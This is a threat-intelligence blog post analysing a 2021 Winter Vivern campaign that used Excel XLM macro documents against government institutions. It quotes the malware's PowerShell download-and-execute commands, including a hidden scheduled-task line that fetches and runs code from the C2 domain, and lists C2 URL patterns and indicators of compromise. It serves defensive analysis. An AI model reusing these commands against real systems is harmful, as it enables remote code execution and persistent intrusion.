# Reference for threat actor for "Winter Vivern"

**Title**: Winter Vivern – all Summer

**Source**: https://lab52.io/blog/winter-vivern-all-summer/

## Content








Winter Vivern – all Summer























 













 Skip to primary navigation Skip to main content Skip to footerlab52The threat intelligence division of S2 GrupoHome
Faq
Blog
About
Contact
Winter Vivern – all Summer
September 28, 2021
In July, 2021, Lab52 found a currently active infection campaign (domain still up at the time of this writing) attributed to a group referred as Wintervivern after a report published by the research team from DomainTools.
As the starting point for this research, we recently noticed that unless properly obfuscated, some functions in XLM macro could show their arguments in the strings of the excel file containing the macros.


We decided to take some advantage from this fact, and we tried to hunt for interesting excel files until we found a set of excel documents that revealed an active campaign against European governments, and without attribution so far.
We first caught a generic powershell line in a XLM macro, which caught our attention along with other keywords:
powershell.exe -c iex((new-object net.webclient).DownloadString(‘https://server/run.txt’))
Additionally, the yara ruleset created by John Lambert (@JohnLaTwC) indicated that the XML macro contained in this document was potentially created using SharpShooter (gen_Excel4Macro_Sharpshooter) which could be a useful fact in order to track the activity of the actors behind these documents.
As stated before, we also found in this same document other very interesting strings that would give an idea about the document’s content, along with some email addresses. Some of this strings were the following:
External Relations CommitteeWorking Party on Short-Term Economic ProspectsGoverning Board of the Development CentreGlobal Forum on Public Governance

Furthermore, this document contained embedded the following URL, many times:
hxxps://securetourspd.]com/syncService/sync.php?v=3ac2cc6263f84836a7cb38d04f1094b6907527c3e0265dd0dc480b0ba1204e51
After a quick behavioral analysis of the document, we found out that the aforementioned command would serve the following new commands using a user-agent filter only serving requests coming from the MS Excel user-agent.

This new set of commands would first download from the same domain a XML file and use it to establish a scheduled task for persistence, with name “Server_Update_Synchronization-{SDFGEYH-9D36-4HB1-8BWD-0EC1BD4FNM131}”, which would execute the following commands after Logon:
powershell.exe -w hidden -c “start-process ‘powershell.exe’ -win hidden -argumentlist {$g=New-Object Net.Webclient;$g.credentials=[net.credentialcache]::DefaultNetworkCredentials;iex g.DownloadString(‘https://securetourspd.com/../users/2cd6c84c6c64ec05e7b418e15f9d1b7c0dc6733154aa266c64f0cb74e2083472/ceec36e6c881b957b52d30cc9848eb53fffb32d5.php’)}
After establishing the persistence, it implements a function which happens to be a minimal RAT which is called every 10 seconds and receives a command from C2, executes it, and sends the result back to the C2.
The contacted domain was registered on July 1st pointing to 185.238.]169.57 associated to the ISP “IROKO Networks Corporation/Scalaxy B.V. Researching about this domain, we found that VirusTotal showed some interesting full URLs, being one of them, the one we already found in the starting document.

It was also interesting the fact that the URL containing “mzv.sk/downloadFile” was actually indexed in Google:

We could also reach some of those downloaded XLS files from the domain, and observed that these documents did not contain any functionality or suspicious strings.
However, after reviewing these documents and the URLs, we noticed that the documents and the domains contained as part of the path in the URL were directly related to different government institutions from different countries:
sds.va –> Segreteria di Stato – Vaticano – Secretariat of Statelrp.lt –> Lietuvos Respublikos Prezidentas – Lithuania – President of the Republic of Lithuaniamzv.sk –> Ministerstvo zahraničných vecí – Slovakia – Ministry of Foreign Affairs
At this point, now we could identify an interesting pattern in the different URLs found that allowed us to divide the C2 contacts in three different URLs for different functionalities.
https:// [C2 domain]/[target domain]/excel_files_service/downloadFile.php?v=[some victim ID]https:// [C2 domain]/syncService/sync.php?v=[some victim ID]https:// [C2 domain]/../users/[some victim ID]/[some file ID].php’https:// [C2 domain]/xml_file.xml
URL #1 would just download the XLS file with no macros, which could indicate that this could be used to serve clean files as a decoy.
URL #2 would be found in XLS files with XLM macros and it could be the first contact with the C2 after the infection. This would trigger the next stages of the infection since it would download and execute the previously documented commands and install the persistence as a scheduled task.
URL #3 would be found within the scheduled task and it would also download the same commands than URL #2 but without the lines to establish the scheduled task. Also, and most importantly, this URL structure would also be used for the C2 communication for command execution using a different [file ID] for command requests or sending command results.
URL #4 would download the xml file used for the scheduled task.
We tried to pull the thread of this URL structures but after some unsuccessful research we had to go back to the execution details, and we finally ended up finding something while searching by the name of the scheduled task.
With the help of Google dorking, we found a new XLS document with excel4 macros uploaded to the public sandbox of any.run:
Ενημερωμένος κατάλογος_NS.xls fdc4631008461df18e78fb653662f111
On the other hand, using the same information we also found in VTi two .txt files named serverHttpRequest(RUN).txt which would be downloaded by different samples:
6661ea544a541357ada6c32eb70cd96c7a59366676daaa95cc71a0110ef75753

The two .txt files resulted to be the same powershell content executed by the first download of the malicious XLS file with slight differences, and the xls file from any.run also resulted to follow the same techniques. In fact, it seems like the excel file would download one of those two files since it would contact the following URL, whose domain was also found in the .txt files:
hxxps://secure-daddy.]com/wintervivern/server/serverHttpRequest(RUN).txt’
At this point, we could relate this new campaign with another recent campaign from a May 2021 named “Winter Vivern” due to the path from URL and described by the research team of DomainTools.
One important thing to note, as DomainTools also stated, is the fact that all the information contained in the different XLS document seems to be public, which means that this documents were carefully crafted to target very specific entities.
Thanks to this new discovery, we obtained a new set of similar malicious XLS with the same excel4 macros, using different domains, which increased the list of targeted countries while still aiming to government institutions.
If we compare the full URLs used in both campaigns we could relate them as equivalent, resulting in:
No equivalent URLhttps:// [C2 domain]/wintervivern/server/serverHttpRequest(RUN).txt’https:// [C2 domain /wintervivern/vivern/getAnswer.php?username=$uname’https:// [C2 domain] /wintervivern/vivern/getcommand?username=$unamehttps:// [C2 domain]/vivern/test_old.xmlhttps:// [C2 domain]/vivern/test.xml
The slight differences found in the analogy of URLs is actually revealing very interesting information about the evolution of this threat actor.
First, we did not find a path serving clean files that we assumed they could be used as a decoy. Secondly, we find a single common URL for all XLS files, instead of containing victim identifiers. Due to the lack of victim identifiers, we would find more generic URLs for the reception of commands and delivery of results, where only the username of the infected computer would be reported to the C2. Lastly, we find two different versions of the xml document served for the scheduled task, both containing “test” as a name. This could be intentional so as not to raise alarms on the victim, but it is clear that there has been a small evolution in some details of the TTPs of this actor, which is currently active.
Indicators of Compromise:
37.252.]9.12337.252.5.]133185.238.]169.57securetourspd[.]comsecure-daddy[.]comcentr-security[.]comsecuremanag[.]commloncar@seidco.]net94f45ba55420961451afd1b70657375ec64b7697a515a37842478a5009694cfa2a176721b35543d7f4d9e3d24a7c50e0ea57d7eaa251c6b24985d5266a6a977af84044bddbd3e05fac1319c988919492971553bb65dbf7b7988d66a8cd677eb8bd1efa4cf3f02cd8723c48deb5f69a432c22f359b93cab4f1d2a9f037a236eaa00f6291012646213a5aab81153490bb121bbf9c64bb62eb4ce582c3af88bccfd638bedcc00c1b1b8a25026b34c29cecc76c050aef56fa55f6e8878e6b951e473c34e98a31246f0903d4742dcf0a9890d5328ba8a1897fcf9cd803e104591ed5f4f498238ba3568fd9dc2d12954e16bdd06ddadd4484fa2b40c6f9cf08a2c1360d66b7443285a23cea3c21cdfeb7fbc22cac53f347437ff26b9d709279996744a0303936e7341b47b797b42b6911101d72a82f38faa263898c5993e7ee90107cc2a176721b35543d7f4d9e3d24a7c50e0ea57d7eaa251c6b24985d5266a6a977a066ac6b068ba1b3f177173a113085cc53c785e875b841948df8bbf095c61807d63005efc652557fad43118273e11f7b37e2d59db2d677e936cddab82fba306022f52434696f98c9668a85f1af5dd4af2be729a7971f878ca9125731e27c63c50b5551ee3d24c53983670fca24e07f0b86ceb3adb7ac353d59fc98f481e5339cacdca87c79b4c3c0ed4ffad2a7a64f267250d94ed9e9f8d931faad91cecb5a5950682e44d2e37f2f7b3f42fffa8366f4b20470ab54ece04da444f47efda1ac610












 








		            Dex                





 + posts 








This author does not have any more posts. 




 


 DexReader Interactions 
Leave a Reply Cancel replyYour email address will not be published. Required fields are marked *Comment Name * 
Email * 
I hereby declare to have read and accepted the legal notice and the privacy policy. * 

 
RelatedNew invitation from APT29 to use CCleanerJuly 12, 2023Tags: APT29, CCleaner, DLLSide-Load, phishing, Russia, SVGBeyond appearances: unknown actor using APT29’s TTP against Chinese usersJuly 07, 2023The Chinese trapJune 08, 2023FooterSearch this website
  Copyright &copy Lab52 2019 by S2 Grupo | Legal notice | Cookie policy | Privacy policy  
























